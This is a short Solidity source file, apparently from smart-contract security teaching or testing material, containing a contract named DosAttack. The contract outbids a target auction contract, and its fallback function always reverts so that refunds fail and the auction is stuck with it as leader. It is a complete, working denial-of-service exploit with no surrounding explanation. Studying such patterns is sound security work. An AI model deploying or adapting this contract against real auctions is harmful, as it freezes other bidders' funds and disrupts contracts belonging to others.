pragma solidity ^0.4.15;

contract DosAttack {
    DosAuction public target;

    constructor(address _target) public {
        target = DosAuction(_target);
    }

    // Become the frontrunner by outbidding
    function attack() public payable {
        require(msg.value > 0);
        target.bid.value(msg.value)();
    }

    // Fallback function reverts to block refunds
    function() public payable {
        revert();
    }
}

